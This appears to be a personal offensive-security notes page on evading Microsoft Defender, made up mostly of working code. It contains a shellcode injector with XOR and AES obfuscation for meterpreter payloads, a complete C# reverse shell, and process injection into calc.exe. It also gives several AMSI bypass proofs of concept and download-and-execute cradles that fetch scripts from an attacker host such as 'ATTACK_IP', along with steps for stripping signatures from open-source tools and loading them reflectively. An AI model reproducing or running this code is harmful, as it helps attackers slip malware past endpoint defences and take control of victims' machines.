Evading AV is a cat-and-mouse game. This page will be tailored towards Defender, but the concepts are universal. Also, some of these techniques might already be outdated. Fun!

For now, this covers .NET / C#... Heavily monitored so might not be that useful against modern EDR. But the general concepts are applicable.
# Microsoft Defender Antivirus
To simplify, Defender AV detection can be categorized in two ways:
	`Static Analysis` : detecting malware on-disk before run.
	`Dynamic Analysis` : detecting active malware in process memory.

Defender will scan files during file creation/modification, and for suspicious behavior, such as anomalous parent -> child processes (word spawning cmd...).
### Interacting with Defender
How do we interact with Defender?
	Windows Security Client Interface (Windows Security App -> Virus & Threat Protection), 
	[Defender Module for PowerShell](https://learn.microsoft.com/en-us/powershell/module/defender/),
	[Other Ways](https://learn.microsoft.com/en-us/defender-endpoint/configuration-management-reference-microsoft-defender-antivirus?view=o365-worldwide)

Defender Module for PowerShell
```powershell
Get-Command -Module Defender # List commands available

# Some common ones
Get-MpComputerStatus   # Status details
Get-MpThreat           # View history of threats detected
Get-MpThreatDetection  -ThreatID <ID>  # Deeper look detected threat
Get-MpPreference       
Set-MpPreference       # Configure Defender
```
# Static Analysis
How does it work? By checking hashes, byte patterns, and strings against a database of known values. Think YARA rules.
## Defender Signature Database
The Defender signature database is not available publicly, but we can explore it indirectly with [ExpandDefenderSig.ps1](https://gist.github.com/mattifestation/3af5a472e11b7e135273e71cb5fed866).

ExpandDefenderSig.ps1
```powershell
Import-Module C:\Tools\ExpandDefenderSig\ExpandDefenderSig.ps1

# Outputing DB to file
ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{50326593-AC5A-4EB5-A3F0-047A75D1470C}\mpavbase.vdm" | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw

# Searching for strings
C:\Tools\Strings\strings64.exe .\mpavbase.raw | Select-String -Pattern "WNcry@2ol7"
```
## ThreatCheck
We can use a tool like [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) to see what exactly is triggering a detection. TLDR: It works by splitting a file into chucks and making Defender AV scan until it triggers a detection.

ThreatCheck.exe
```powershell
C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f .\NotMalware.exe
	# Should show what bad hex is causing the issue. 
```
## Reference Shellcode Injector
Here is a simple shellcode injector to be used as reference. 

```csharp
using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
            byte[] buf = new byte[] {<SNIP>};

            // Allocate RW space for shellcode
            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

            // Execute the shellcode in a new thread
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}
```

> In Visual Studio, New project > C# Console App (.NET). When compiling, make sure correct architecture is selected (usually x64) + Release.
## XOR Encryption
A common way of bypassing detection is XOR-ing shellcode stored in the program, then XOR-ing again right before writing into memory so original values are restored.

A [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')XOR(%7B'option':'Hex','string':'5c'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)) formula for this
	From Hex - 0x with Comma
	XOR - Key 5c HEX, Scheme Standard
	To Hex - 0x with comma, 0 bytes per line

Replace shellcode in program with output, then add a loop which XORs each byte with `0x5C` before writing shellcode to memory
```csharp
<SNIP>

// XOR'd shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
byte[] buf = new byte[] { <NEW_SHELLCODE_HERE> }

// Allocate RW space for shellcode
<SNIP>

// Decrypt shellcode  (The addition!)
int i = 0;
while (i < buf.Length)
{
    buf[i] = (byte)(buf[i] ^ 0x5c);
    i++;
}

// Copy shellcode into allocated space
<SNIP>
```

> This used to work by itself but now not so much. If XOR fails, move on to `AES-encrypting` shellcode instead.
## AES Encryption
A [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')) formula for this:
	From Hex - 0x with comma
	AES Encrypt -
		key - arbitrary
		IV - arbitrary
		Mode - CBC
		Input - Raw
		Output - Raw
	To Base64 - Alphabet A-Za-z0-9+/=

Modifying the program
```csharp
<SNIP>
using System.Security.Cryptography; //IMPORTANT

namespace NotMalware
{
    internal class Program
    {
        <SNIP>

        static void Main(string[] args)
        {
            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
            string bufEnc = "<ENCODED_SHELLCODE>";

            // Decrypt shellcode
            Aes aes = Aes.Create();
            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] buf;
            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            // Allocate RW space for shellcode
            <SNIP>
```
# Dynamic Analysis
Certain events can trigger memory scans, such as new process creation or suspicious behavior. So even if we bypass static analysis, malware running may get flagged.
## Modify the Payload
We can modify source code of the payload, so that:
	it avoids triggering a memory scan,
	or does not match any signatures if scanned.

Out of scope here, but consider going through an Assembly Intro. 
## Change the Payload
We can replace the payload with a less known one. For instance, `meterpreter` is heavily signatured, but something like [micr0_shell](https://github.com/senzee1984/micr0_shell) might not be.

```powershell
python.exe .\micr0_shell.py -i <IP> -p 8080 -l csharp
```
Then just paste the new shellcode in the program we made and recompile.

> **NOTE**: When compiling, you MUST select x64 CPU for this to work.
## Writing Custom Tools
Most time-consuming option, but least likely to get caught. Below is a custom reverse shell example

Visual Studio > Console App (.NET) > "RShell"
```csharp
using System;
using System.IO;             // read/write to TCP stream
using System.Net.Sockets;    // TCP Connection handling
using System.Diagnostics;    // Used to spawn cmd.exe / powerhshell.exe

namespace RShell
{
    internal class Program
    {
        private static StreamWriter streamWriter; // Needs to be global so that HandleDataReceived() can access it

        static void Main(string[] args)
        {
            // Check for correct number of arguments
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: RShell.exe <IP> <Port>");
                return;
            }

            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect(args[0], int.Parse(args[1]));

                // Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }
        
        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}
```
# Process Injection
An evasion technique which entails running malicious code within the address space of another process.
	DLL Injection 
		Write path of evil DLL into address space of target process, -> call LoadLibrary
	PE Injection
		Copy code into address space of target process -> call CreateRemoteThread
	Process Hollowing
		Spawn target process in suspended state -> replace entry point in memory with own code -> resume process
	Threat Execution Hijacking
		Suspend thread in target process -> replace code w/ evil code -> resume thread
## Intro to PE Injection
A few ways to achieve this, but most common uses these WinAPI functions:
	[VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate space in the memory of target process for our shellcode
	[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write our shellcode into that allocated space
	[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) to execute the shellcode in the target process

Parameters of each WinAPI function
```csharp
lpBaseAddress = VirtualAllocEx(
    hProcess, // Handle to the target process
    lpAddress, // Desired starting address, or NULL to let it decide
    dwSize, // Size of the memory region to allocate in bytes
    flAllocationType, // Type of memory allocation (Commit, Reserve, etc...)
    flProtect // Memory protection (Read/Write, Read/Write/Execute, etc...)
);

WriteProcessMemory(
    hProcess, // Handle to target process
    lpBaseAddress, // Where to write the data (value returned from VirtualAllocEx)
    lpBuffer, // Pointer to our shellcode
    nSize, // Size of the shellcode buffer
    *lpNumberOfBytesWritten // Pointer to a variable which will be set to number of bytes written
);

CreateRemoteThread(
    hProcess, // Handle to target process
    lpThreadAttributes, // Security descriptor for new thread, or NULL to let it decide
    dwStackSize, // Initial size of stack, or NULL to let it decide
    lpStartAddress, // Pointer to beginning of thread (value returned from VirtualAllocEx)
    lpParameter, // Pointer to variable to be passed to the thread, or NULL if there are none
    dwCreationFlags, // Flag which controls the thread creation
    lpThreadId // Pointer to a variable which will be set to the thread ID, or NULL if we don't care
);
```

Some additions:
	[CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) to spawn our target process 
	[VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex) so we can initially allocate memory with Read/Write memory protection. **OPSEC**: AV finds Read/Write/Execute suspicious, so this is a workaround
##### Demonstration
We will use [P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) like previous examples. This lets us access functions in unmanaged libraries from out managed c# code.

> Release, x64

Visual Studio > C# Console App (.NET) > AlsoNotMalware
```csharp
using System;
using System.Runtime.InteropServices;

namespace AlsoNotMalware
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;

        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            byte[] buf = {<SNIP>};

			// 1. Create the target process
			STARTUPINFO startInfo = new STARTUPINFO();
			PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
			uint flags = DetachedProcess | CreateNoWindow;
			CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\calc.exe", IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo);
			
			// 2. Allocate RW space for shellcode in target process
			IntPtr lpBaseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, PageReadWrite);
			
			// 3. Copy shellcode to target process
			IntPtr outSize;
WriteProcessMemory(procInfo.hProcess, lpBaseAddress, buf, buf.Length, out outSize);

			// 4. Make shellcode in target process's memory executable
			uint lpflOldProtect;
			VirtualProtectEx(procInfo.hProcess, lpBaseAddress, (uint)buf.Length, PageReadExecute, out lpflOldProtect);
			
			// 5. Create remote thread in target process
			IntPtr hThread = CreateRemoteThread(procInfo.hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```
# Antimalware Scan Interface (AMSI)
The [Antimalware Scan Interface (AMSI)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) is a standardized interface which Windows applications can use to interact with the antimalware software in use. Applications can make use of the functions [AmsiScanBuffer](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) and [AmsiScanString](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanstring) to scan input for malicious content.

Although any application can make use of `AMSI`, PowerShell is a common example of it. Think of it as a way for PS to run signature scans against commands before running them.
## Bypassing AMSI (in PowerShell)
When researchers mention bypassing `AMSI`, they mean preventing PowerShell from using `AmsiScanBuffer` and `AmsiScanString` functions, therefore no scanning.

The following bypasses will largely utilize sting manipulation.
### Setting amsiInitFailed
We can set `amsiInitFailed` to `true` so that `ScanContent` always returns `AMSI_RESULT_NOT_DETECTED` and bypass `AMSI`

POC
```powershell
# Core - wont work anymore :(
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# New and improved lol!
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)

# Check
'amsiUtils'   # should not get blocked.
```

Why does this work?
	Use a decomplication tool like `dnSpy` to open `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll` 
	to see the ScanContent method in action
### Patching amsiScanBuffer
We can patch `AmsiScanBuffer` to always return an error code and bypass `AMSI`

POC
```powershell
# Pick an error code HREESULT value
0x80004005 # E_FAIL HRESULT value we can arbitrarily pick

# Convert to shellcode with Online x86 / x64 ASM Assembler
mox eax, 0x80004005;
ret;

{ 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3 } # We will weaponize this

# Host this on attack server
## bypass.ps1
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3); # EVIL
$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;

# Download / Execute cradle from victim
(New-Object Net-WebClient).DownloadString('http://ATTACK_IP/bypass.ps1') | IEX;

# Check
'amsiUtils' # should not get blocked
```

Why does this work?
	`AmsiScanBuffer` returns an `HRESULT` value. Either S_OK or an error code.
	So we can reference [these HRESULT values](https://learn.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values) and pick an error one.
	Use an[ online assembler / disassembler](https://defuse.ca/online-x86-assembler.htm) to create shellcode
	Then load `amsi.dll`, and overwrite the beginning of `AmsiScanBuffer` with our shellcode.
### Forcing an Error
We can assign a 4-byte buffer to `amsiContext`, then set to null, to ensure a particular error code and bypass AMSI.

POC
```powershell
# Host this on attack server
## bypass.ps1
$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context','NonPublic,Static');
$session = $utils.GetField('amsi'+'Session','NonPublic,Static');

$marshal = [System.Runtime.InteropServices.Marshal];
$newContext = $marshal::AllocHGlobal(4);

$context.SetValue($null,[IntPtr]$newContext);
$session.SetValue($null,$null);

# Download / Execute cradle from victim
(New-Object Net-WebClient).DownloadString('http://ATTACK_IP/bypass.ps1') | IEX;

# Check
'amsiUtils' # should not get blocked
```

Why does this work?
	The specific check being abused lives in `AmsiOpenSession` inside `amsi.dll`: it reads the first 4 bytes of the `amsiContext` structure and confirms they spell `"AMSI"`. If they don't, it returns HRESULT `0x80070057` ("one or more arguments are invalid"), which counts as a failure and sets `amsiInitFailed = true`. Determining this requires IDA.
# Open-Source Software
Open source tooling is often heavily signatured. Here are some ways to modify open-source software to evade detection.
## Manually Breaking Signatures
The most tedious way of getting open-source software to get past Defender is:
	1. Compile
	2. ThreatCheck to locate the bytes that trigger deteciton
	3. Modify source code
	4. Repeat

1.
>Strings flagging? If the strings are NOT found in functions, you can try [Ctrl] + [Shift] + H... this lets us replace strings in the ENTIRE solution. For example, replace `ticket` with `teckit` in something like Rubeus.

2.
If you can't replace everything, you can try one offs. Use [Ctrl] + [Shift] + F to find out where it lives. Right click to rename classes.

3.
What about metadata getting flagged? For example, a Typelib GUID. Detection rules often pick low hanging fruit, so we can just adjust and bypass.

```powershell
# Generate a new GUID
[GUID]::NewGUID()

# Modify program
Visual Studio > Project > Properties > Update GUID
Application > Assembly Properties > Update GUID

# Rebuild
```

N-times...
Eventually, no threats found!
## Reflectively Loading Assemblies in PowerShell
It is possible to load C# assemblies into memory in PowerShell and interact with them as any other object. No writing to disk required!

> **NOTE:** Don't forget we still need an AMSI bypass. So do that first, then do this. 

POC
```powershell
# Make copy of a tool
C:\Tools\Seatbelt -> C:\Tools\Seatbelt-PS  # or something like this

# Change all methods in program.cs from private to public
public static void Main(string[] args) # example of Main function

# Release mode, compile

# Compress and Encode the assembly with GZIP and Base64 via Cyberchef
Gzip       # This is the recipe
To Base64  # This is the recipe part 2
Import the assembly, then copy the output

# THE SCRIPT
## Invoke-Seatbelt.ps1
function Invoke-Seatbelt {
    [CmdletBinding()]
    Param (
        [String]
        $Command = " "
    )

    # Seatbelt.exe -> Gzip -> Base64
    $gzipB64 = "<SNIP>";   # ASSEMBLY GOES IN HERE

    # Base64 decode
    $gzipBytes = [Convert]::FromBase64String($gzipB64);

    # Gzip decompress
    $gzipMemoryStream = New-Object IO.MemoryStream(, $gzipBytes);
    $gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress);
    $seatbeltMemoryStream = New-Object System.IO.MemoryStream;
    $gzipStream.CopyTo($seatbeltMemoryStream);

    # Load assembly reflectively
    $seatbeltArray = $seatbeltMemoryStream.ToArray();
    $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);

    # Redirect assembly STDOUT to console
    $OldConsoleOut = [Console]::Out;
    $StringWriter = New-Object IO.StringWriter;
    [Console]::SetOut($StringWriter);

    # Call main method
    [Seatbelt.Program]::Main($Command.Split(" "));

    # Reset STDOUT
    [Console]::SetOut($OldConsoleOut);
    $Results = $StringWriter.ToString();
    $Results;
}
# NOTE: If you are transfering this to from a DEV box to an ATTACK box ie: Windows -> Linux, you can POSSIBLY run into issues during IEX phase. Consider throwing .ps1 template on ATTACK box first, then pasting assembly directly there.

# Example of execution
$wc = New-Object Net.WebClient;
$wc.DownloadString('http://ip/AMSI-Bypass.ps1')|IEX;
$wc.DownloadString('http://ip/Invoke-Seatbelt.ps1')|IEX;
Invoke-Seatbelt LSASettings # Example
```